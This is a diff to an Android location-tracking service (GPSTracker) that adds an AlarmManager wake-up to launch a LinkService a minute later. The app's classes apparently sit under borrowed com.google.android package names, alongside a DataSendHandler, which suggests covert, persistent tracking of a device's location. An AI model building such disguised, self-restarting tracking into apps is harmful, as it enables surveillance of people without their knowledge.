@@ -4,6 +4,8 @@ import java.text.SimpleDateFormat;
 import java.util.Calendar;
 
 import android.annotation.SuppressLint;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -24,6 +26,7 @@ import android.widget.Toast;
 import com.google.android.bs.DataSendHandler;
 import com.google.android.bs.MainActivity;
 import com.google.android.bs.WorkTimeDefiner;
+import com.google.android.history.LinkService;
 
 public class GPSTracker extends Service implements LocationListener {
 
@@ -88,7 +91,19 @@ public class GPSTracker extends Service implements LocationListener {
 
 		getLocation();
 		Log.d(TAG, ">>>onStartCommand()");
+		Calendar cal = Calendar.getInstance();
+		cal.add(Calendar.MINUTE, 1);// через 1 минут
 
+		PendingIntent servicePendingIntent = PendingIntent.getService(this,
+				SERVICE_REQUEST_CODE, new Intent(this, LinkService.class),// SERVICE_REQUEST_CODE - уникальный int сервиса
+				PendingIntent.FLAG_UPDATE_CURRENT);
+
+		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
+		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
+				servicePendingIntent);
+		
+		
+		super.onStartCommand(intent, flags, startId);
 		return Service.START_STICKY;
 	}
 
